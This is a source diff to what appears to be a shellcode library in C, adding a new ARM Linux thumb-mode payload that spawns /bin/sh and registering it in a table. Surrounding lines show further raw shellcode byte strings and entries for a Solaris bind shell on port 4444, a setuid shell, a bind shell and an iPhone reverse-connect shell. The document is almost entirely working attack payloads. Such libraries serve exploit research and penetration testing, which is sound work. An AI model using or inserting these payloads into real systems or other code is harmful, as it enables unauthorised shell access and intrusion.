@@ -517,6 +517,10 @@ unsigned char x86_solaris_bind4444[] =
    "\xc0\xdd\x3a\x5f\x8d\x01\x5a\xdf\x6f\xb8\x35\x72\xea\x41\x72\x7f"
    "\x6f\x60\x24\xa2\x4c\x60\x63\xa2\x5d\x61\x65\x04\xdc\x58\x58\x04"
    "\xdd\x58\x59\xde\x8f\x33\xf4\x58";
+
+char *arm_linux_thumb="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
+   "\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
+
 char arm_linux_binsh[]= "\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5"
    "\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
    "\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef/bin/sh";
@@ -781,6 +785,7 @@ char x86_ppc_osx_binsh[] =
 
 struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"arm.linux.binsh",       arm_linux_binsh,          "Runs /bin/sh" )
+ ENTRY(0,0,0,"arm.linux.thumb",       arm_linux_thumb,          "Runs /bin/sh using thumb mode trick" )
  ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
  ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,           "Binds /bin/sh to a tcp port" )
  ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,        "iPhone reverse connect shell to HOST and PORT" )
